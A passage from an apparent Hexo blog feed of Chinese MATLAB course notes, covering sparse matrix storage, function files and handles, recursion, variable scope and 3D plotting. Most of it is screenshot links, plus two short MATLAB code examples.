src="https://img-blog.csdnimg.cn/20200226012854481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226013028960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="E-稀疏矩阵"><a href="#E-稀疏矩阵" class="headerlink" title="E 稀疏矩阵"></a>E 稀疏矩阵</h1><p>稀疏矩阵指的是零元素个数远远多于非零元素个数的矩阵，如果将大量的零元素也存储起来，必将导致存储空间的浪费。为此，MATLAB为稀疏矩阵提供特殊的存储方式。</p>
<h2 id="E-a矩阵的存储方式"><a href="#E-a矩阵的存储方式" class="headerlink" title="E.a矩阵的存储方式"></a>E.a矩阵的存储方式</h2><p><img src="https://img-blog.csdnimg.cn/20200226022859678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200226023031222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="E-b-稀疏存储方式的产生"><a href="#E-b-稀疏存储方式的产生" class="headerlink" title="E.b 稀疏存储方式的产生"></a>E.b 稀疏存储方式的产生</h2><p><img src="https://img-blog.csdnimg.cn/20200226023122506.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200226023304423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/2020022602350310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/2020022602353898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/2020022602383560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用A的一行元素表示一个稀疏矩阵的元素，相当于A每一行的每个元素是相应的稀疏矩阵元素的一个信息。这些信息组合经过<code>spconvert</code>就可以得到相应的稀疏矩阵元素。<br>例子：<br>A描述的稀疏矩阵：[2，2，1：第二行第二列的1；2，1，-1：第二行第一列的-1；2，4，3：第二行第四列的3；其他为0。]经过<code>spconvert</code>实现A描述的稀疏矩阵。<br><img src="https://img-blog.csdnimg.cn/20200226024306977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200226024731653.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226024859640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200226025105454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226030758808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>A的稀疏存储：<br><img src="https://img-blog.csdnimg.cn/20200226025205518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200226025314929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="E-c-稀疏矩阵应用举例"><a href="#E-c-稀疏矩阵应用举例" class="headerlink" title="E.c 稀疏矩阵应用举例"></a>E.c 稀疏矩阵应用举例</h2><p><img src="https://img-blog.csdnimg.cn/20200226025405639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clc;clear</span><br><span class="line">kf1= [1;1;2;1;0];     % 主对角线以下第一条元素</span><br><span class="line">k0 = [2;4;6;6;1];     % 主对角线元素</span><br><span class="line">k1 = [0;3;1;4;2];     % 主对角线以上第一条元素</span><br><span class="line">B = [kf1,k0,k1];</span><br><span class="line">d = [-1;0;1];</span><br><span class="line">A = spdiags(B,d,5,5); % 产生稀疏存储的稀疏矩阵</span><br><span class="line">f = [0;3;2;1;5];</span><br><span class="line">x = A\f               %求出解</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200226031806642.png" alt="在这里插入图片描述"></p>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(03)Matlab程序流程控制(2)函数</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8803%EF%BC%89%E3%80%90matlab%E3%80%91Matlab%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(2)%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="F-函数文件的定义与调用"><a href="#F-函数文件的定义与调用" class="headerlink" title="F 函数文件的定义与调用"></a>F 函数文件的定义与调用</h1><h2 id="F-a函数文件的基本结构"><a href="#F-a函数文件的基本结构" class="headerlink" title="F.a函数文件的基本结构"></a>F.a函数文件的基本结构</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200226162544633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226162101981.png" alt="在这里插入图片描述"><br>注意：当函数名与函数文件名不同时，MATLAB将忽略函数名，调用时使用函数文件名。</p>
<span id="more"></span>

<p>例题：<br><img src="https://img-blog.csdnimg.cn/20200226162313339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="F-b-函数调用"><a href="#F-b-函数调用" class="headerlink" title="F.b 函数调用"></a>F.b 函数调用</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200226162645415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200226162741935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="F-c-匿名函数"><a href="#F-c-匿名函数" class="headerlink" title="F.c 匿名函数"></a>F.c 匿名函数</h2><p>匿名函数不用函数文件定义，直接在程序脚本中创建。<br><img src="https://img-blog.csdnimg.cn/2020022616305056.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200226170501499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<p>给已经存在的函数定义函数句柄：<br><img src="https://img-blog.csdnimg.cn/20200226170603614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<p>例题：<br><img src="https://img-blog.csdnimg.cn/20200226171007664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="G-函数的递归调用"><a href="#G-函数的递归调用" class="headerlink" title="G 函数的递归调用"></a>G 函数的递归调用</h1><p><img src="https://img-blog.csdnimg.cn/20200226233422700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022623351713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226233634123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200226234118335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226234309272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="H函数参数与变量的作用域"><a href="#H函数参数与变量的作用域" class="headerlink" title="H函数参数与变量的作用域"></a>H函数参数与变量的作用域</h1><h2 id="H-a-函数参数的可调性"><a href="#H-a-函数参数的可调性" class="headerlink" title="H.a 函数参数的可调性"></a>H.a 函数参数的可调性</h2><p><img src="https://img-blog.csdnimg.cn/20200226235519406.png" alt="在这里插入图片描述"><br>例子（nargin）：<br><img src="https://img-blog.csdnimg.cn/20200227000536398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子（nargout）:</p>
<p>建立函数文件subtract.m</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> [dif, absdif] = subtract(a,b)</span><br><span class="line">    dif = a-b;</span><br><span class="line">    <span class="keyword">if</span> nargout==2</span><br><span class="line">       absdif=abs(dif);</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200227002434406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="H-b-局部变量与全局变量"><a href="#H-b-局部变量与全局变量" class="headerlink" title="H.b 局部变量与全局变量"></a>H.b 局部变量与全局变量</h2><p><img src="https://img-blog.csdnimg.cn/20200227000715894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227001027752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(04)Matlab绘图（2）</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8804%EF%BC%89%E3%80%90Matlab%E3%80%91Matlab%E7%BB%98%E5%9B%BE%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<h1 id="D-三维曲线"><a href="#D-三维曲线" class="headerlink" title="D 三维曲线"></a>D 三维曲线</h1><h2 id="D-a-plot3函数"><a href="#D-a-plot3函数" class="headerlink" title="D.a plot3函数"></a>D.a plot3函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227150015131.png" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200227150218783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227150359390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227151350527.png"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227151124466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>等价于：<br><img src="https://img-blog.csdnimg.cn/20200227151223130.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227151253256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227151634244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227151715987.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227151803105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="D-b-fplot3函数"><a href="#D-b-fplot3函数" class="headerlink" title="D.b fplot3函数"></a>D.b fplot3函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227151854278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227151945389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="E-三维曲面"><a href="#E-三维曲面" class="headerlink" title="E 三维曲面"></a>E 三维曲面</h1><h2 id="E-a-平面网格数据的生成"><a href="#E-a-平面网格数据的生成" class="headerlink" title="E.a 平面网格数据的生成"></a>E.a 平面网格数据的生成</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/2020022715242279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选定一矩形区域，左下角坐标为（2，3），右上角坐标为（6，8），在x方向分成（6-2）份，y方向分成（8-3）份，将矩阵分成5行4列20个小矩形，交点数目为（6*5）个。用两个矩阵存储每个小点的x，y坐标。矩阵X,Y就是该矩形区域的X-Y平面网格生成矩阵。<br><img src="https://img-blog.csdnimg.cn/20200227153029607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227155158897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227153500425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227153811903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="E-b-绘制三维曲面的mesh函数和surf函数"><a href="#E-b-绘制三维曲面的mesh函数和surf函数" class="headerlink" title="E.b 绘制三维曲面的mesh函数和surf函数"></a>E.b 绘制三维曲面的mesh函数和surf函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227155510929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200227155702910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>颜色沿着z轴变化<br><img src="https://img-blog.csdnimg.cn/20200227160017318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227160155869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20200227160306909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="E-c-标准三维曲面（sphere-cylinder；peaks）"><a href="#E-c-标准三维曲面（sphere-cylinder；peaks）" class="headerlink" title="E.c 标准三维曲面（sphere;cylinder；peaks）"></a>E.c 标准三维曲面（sphere;cylinder；peaks）</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227160419434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别用于绘制球面和柱面。<br>sphere将产生3个n+1阶的方阵，可以绘制出圆心位于原点，半径为1的单位球体，如果调用该函数时，不带输出参数，则直接绘制球面，n决定球面圆滑程度，默认20，n越大，越光滑。<br>cyinder函数的R是一个向量，<strong>存放柱面各个等间隔高度上的半径</strong>，n表示在圆柱圆周上有n个间隔点，默认20个，n越大，越光滑。如果R是一个标量，则生成一个圆柱面。<br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227161212484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200227161509465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227162048580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>peak(n):参数为一个标量，生成n阶方阵<br>peaks(V)、peaks(x,y):若参数为向量或网格矩阵代入$f(x,y)$,计算得到高度矩阵，用peaks生成的矩阵，可以用于mesh、surf的参数绘制多峰函数曲面图。</p>
</blockquote>
<h2 id="E-d-fsurf函数和fmesh函数"><a href="#E-d-fsurf函数和fmesh函数" class="headerlink" title="E.d fsurf函数和fmesh函数"></a>E.d fsurf函数和fmesh函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227163129515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227163418302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="F-图形修饰处理"><a href="#F-图形修饰处理" class="headerlink" title="F 图形修饰处理"></a>F 图形修饰处理</h1><h2 id="F-a-视点处理-view"><a href="#F-a-视点处理-view" class="headerlink" title="F.a 视点处理(view)"></a>F.a 视点处理(view)</h2><p>视点可由方位角和仰角表示。<br><img src="https://img-blog.csdnimg.cn/20200227163711597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227163833872.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227163916978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227164013456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>view(2):二维角度；<br>view（3）：三维角度</p>
</blockquote>
<h2 id="F-b-色彩处理-colormap；shading"><a href="#F-b-色彩处理-colormap；shading" class="headerlink" title="F.b 色彩处理(colormap；shading)"></a>F.b 色彩处理(colormap；shading)</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200227164523794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022716462837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227164719904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227164747789.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227164758498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227164933824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<img 